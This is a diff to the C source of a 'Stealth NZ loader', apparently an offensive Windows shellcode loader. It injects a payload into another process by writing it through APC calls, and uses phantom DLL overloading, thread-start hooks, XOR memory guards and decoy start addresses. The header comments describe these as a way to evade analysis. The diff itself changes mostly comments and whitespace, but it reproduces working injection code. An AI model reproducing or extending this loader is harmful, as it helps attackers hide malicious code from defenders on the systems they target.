@@ -1,4 +1,3 @@
-
 /****
  * Stealth NZ loader: a APC write method with custom phantom DLL overloading
  * Threadless execution
@@ -14,7 +13,7 @@
  * the exception handler will then change the page permission back to PAGE_EXECUTE_READWRITE, XOR the magic code
  * and then change the page permission to PAGE_EXECUTE_READ. The magiccode will be resumed at that point. 
  * We actually hooked the ntdll!RtlUserThreadStart and kernel32!BaseThreadInitThunk functions instead of NtReateThreadEx to extend the range of stealth. ntdll!RtlUserThreadStart is the first function called by every new thread, and it typically calls kernel32!BaseThreadInitThunk. The Sifu memory guard will apply XOR, PAGE_NOACCESS with real thread start address, but the "LPTHREAD_START_ROUTINE lpStartAddress" will be pointed to the decoy thread start address for both of the functions.
- *  Add ROP Trampoliine to the kernel32!BaseThreadInitThunk for additional complexity to analyse. 
+ *  VEH: Add ROP Trampoliine to the kernel32!BaseThreadInitThunk for additional complexity to analyse. 
  * TOGO: 
  * This technique can be applied to other NT functions as well.
  * Author: Thomas X Meng
@@ -1154,6 +1153,7 @@ typedef NTSTATUS (NTAPI *NtQueueApcThreadEx2_t)(
 
 
 
+
 // Function to write memory using APCs with an option to choose the thread creation method
 DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength, BOOL useRtlCreateUserThread, BOOL bUseCreateThreadpoolWait) {
     HANDLE hThread = NULL;
@@ -1284,7 +1284,7 @@ DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD 
     // };
 
 
-
+    // QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC makes it non-alterable compatiable. 
     QUEUE_USER_APC_FLAGS apcFlags = bUseCreateThreadpoolWait ? QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC : QUEUE_USER_APC_FLAGS_NONE;
 
     for (DWORD i = 0; i < dwLength; i++) {
@@ -1705,7 +1705,6 @@ int main(int argc, char *argv[])
 
 
 
-
     // for NtCreateSection and NtMapViewOfSection
     // PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBase;
     // PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
@@ -1810,6 +1809,10 @@ int main(int argc, char *argv[])
     if (hProcess != NULL) {
         result = WriteProcessMemoryAPC(hProcess, (BYTE*)dllEntryPoint, (BYTE*)magiccode, magiccodeSize, bUseRtlCreateUserThread, bUseCreateThreadpoolWait); 
     }
+
+
+    //####END####
+    
 
     // call RollbackTransaction:
 
@@ -2394,7 +2397,7 @@ void *GetNtdllBase() {
 
     // #ifdef _WIN64
     //     __asm__ volatile (
-    //         "movq %%gs:0x60, %0" // Read PEB address from the GS segment register
+    //         "movq %%gs:0x60, %0" // Read PEB address from the GS segment register, PEB is pointed by a pointer at offset 0x60 to the TEB. 
     //         : "=r" (pPEB)
     //     );
     // #else
